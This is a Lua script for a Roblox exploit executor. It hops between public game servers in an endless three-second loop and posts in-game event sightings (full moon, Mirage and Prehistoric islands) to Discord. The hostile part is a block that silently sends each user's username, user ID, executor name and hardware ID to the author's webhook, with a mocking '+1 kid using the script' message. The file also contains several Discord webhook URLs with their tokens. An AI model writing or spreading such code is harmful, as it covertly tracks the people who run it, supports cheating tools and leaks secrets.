
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")


local AllServer = {}
local PlaceId = game.PlaceId
local JobId = game.JobId


local function GetServers()
    local Servers = {}
    local cursor = ""
    while true do
        local url = "https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?limit=100"..(cursor ~= "" and "&cursor="..cursor or "")
        local success, result = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        if success and result and result.data then
            for _, server in pairs(result.data) do
                if server.playing < server.maxPlayers and server.id ~= JobId and not AllServer[server.id] then
                    table.insert(Servers, server.id)
                    AllServer[server.id] = true
                end
            end
            if result.nextPageCursor then
                cursor = result.nextPageCursor
            else
                break
            end
        else
            break
        end
        wait(3)
    end
    return Servers
end


local function Hop()
    local servers = GetServers()
    if #servers > 0 then
        local serverId = servers[math.random(1, #servers)]
        TeleportService:TeleportToPlaceInstance(PlaceId, serverId, Players.LocalPlayer)
    else
        warn("Không tìm thấy server phù hợp!")
    end
end


task.spawn(function()
    while true do
        wait(3) 
        Hop()
    end
end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local jobId = game.JobId
local placeId = game.PlaceId


local function getTimeOfDay()
    local time = tonumber(Lighting.ClockTime)
    if time >= 5 and time < 12 then
        return "☀️ Buổi sáng"
    elseif time >= 12 and time < 18 then
        return "🌤 Buổi chiều"
    else
        return "🌙 Buổi tối"
    end
end


local function sendWebhook(url, message)
    local requestFunc = syn and syn.request or http_request or request or (http and http.request)
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(message)
            })
        end)
    end
end

local displayName = player.DisplayName
local username = player.Name
local userId = player.UserId
local executor = identifyexecutor and identifyexecutor() or "Không xác định"
local hwid = (syn and syn.gethwid and syn.gethwid()) or "Không hỗ trợ"
local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..placeId..', "'..jobId..'")'

local accountWebhook = {
    embeds = {{
        title = "Thông Tin Tài Khoản Roblox",
        color = 0x00FFFF,
        fields = {
            { name = "Tên hiển thị", value = "`" .. displayName .. "`" },
            { name = "Tên người dùng", value = "`" .. username .. "`" },
            { name = "User ID", value = "`" .. userId .. "`" },
            { name = "Executor", value = "`" .. executor .. "`" },
            { name = "HWID", value = "`" .. hwid .. "`" },
            { name = "Place ID", value = "`" .. placeId .. "`" },
            { name = "Job ID", value = "`" .. jobId .. "`" },
            { name = "Script Hop", value = "```lua\n" .. joinScript .. "\n```" },
            { name = "✅ Trạng thái", value = "**+1 bé dùng script **\n🔥 *Cảm Ơn Chúng Mày*" }
        }
    }}
}

sendWebhook("https://discord.com/api/webhooks/1380938876096610394/lWZBTIKe8xZOVJ71WZp9ngjHhcNbwE0Avprv6BZgREUpiP9rdzbW-aEaAhMZCMEWnh2a", accountWebhook)

if placeId == 7449423635 then
    local function getMoonTimer(phase)
        if phase == 5 then
            return "✅ **FULL MOON!**"
        elseif phase == 4 then
            return "🌑 **Sắp Trăng Tròn (~1 phút)**"
        elseif phase == 3 then
            return "🕒 **Còn ~2 phút nữa**"
        else
            return "⌛ **Còn lâu mới tới trăng tròn**"
        end
    end

    local moonSent = false
    task.spawn(function()
        while true do
            local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
            if moonPhase == 5 and not moonSent then
                local fullMoonWebhook = {
                    username = "PHUCMAX",
                    embeds = {{
                        title = "🌑 Full Moon Server Found [THIRD SEA]",
                        color = 16776960,
                        fields = {
                            { name = "⏳ Full Moon Status:", value = getMoonTimer(moonPhase), inline = true },
                            { name = "👥 Players:", value = #Players:GetPlayers() .. "/12", inline = true },
                            { name = "🌑 Moon Phase:", value = tostring(moonPhase) .. "/5", inline = true },
                            { name = "🆔 JobId:", value = "```" .. jobId .. "```", inline = false }
                        },
                        footer = { text = "PHUCMAX | " .. os.date("%d/%m/%Y %H:%M:%S") }
                    }}
                }
                sendWebhook("https://discord.com/api/webhooks/1380937704925167666/m6Y9QI4NZ9qbRwukMTyxPEmIa-W10rb9hf7D8MdMl-8vTguL0xbdPf-vGDAmO868GfYd", fullMoonWebhook)
                moonSent = true
            elseif moonPhase ~= 5 then
                moonSent = false
            end
            task.wait(10)
        end
    end)
end

task.wait(10)
for _, v in pairs(workspace:GetDescendants()) do
    if (v:IsA("BasePart") or v:IsA("Model")) and v.Name:lower():find("mirage") then
        local mirageWebhook = {
            username = "phucmax Mirage Notify",
            embeds = {{
                title = "**phucmax Mirage Notify**",
                color = 16753920,
                fields = {
                    { name = "🏝️Spawn:", value = "Mirage Island", inline = true },
                    { name = "🕛Time Of Day:", value = getTimeOfDay(), inline = true },
                    { name = "👥 Players:", value = #Players:GetPlayers() .. " players", inline = true },
                    { name = "🆔Job-Id:", value = "```" .. jobId .. "```", inline = false }
                },
                footer = { text = "phucmax | " .. os.date("Hôm nay lúc %H:%M") }
            }}
        }
        print("✅ Mirage Island được tìm thấy:", v:GetFullName())
        sendWebhook("https://discord.com/api/webhooks/1380938550962556938/NY9VImFOcUSe8zwMdY68k0YHuwSHGzCrPFpeXlJVUIU_PQw6m4PkyO6VusHjHOoi3JEL", mirageWebhook)
        break
    end
end

task.wait(5)
for _, v in pairs(workspace:GetDescendants()) do
    if (v:IsA("BasePart") or v:IsA("Model")) and v.Name:lower():find("prehistoric") then
        local prehistoricWebhook = {
            username = "phucmax Prehistoric Notify",
            embeds = {{
                title = "**phucmax Prehistoric Notify**",
                color = 16753920,
                fields = {
                    { name = "🌋Spawn:", value = "Prehistoric Island", inline = true },
                    { name = "🕛Time Of Day:", value = getTimeOfDay(), inline = true },
                    { name = "👥 Players:", value = #Players:GetPlayers() .. " players", inline = true },
                    { name = "🆔Job-Id:", value = "```" .. jobId .. "```", inline = false }
                },
                footer = { text = "phucmax| " .. os.date("Hôm nay lúc %H:%M") }
            }}
        }
        print("✅ Prehistoric Island được tìm thấy:", v:GetFullName())
        sendWebhook("https://discord.com/api/webhooks/1380938259282133074/4vz23EwIJzX36MS_I_JyVxaQLhJtgEBJITd83xt2pq41QHrLwFNnhcBLd66lfkmEWsEQ", prehistoricWebhook)
        break
    end
end
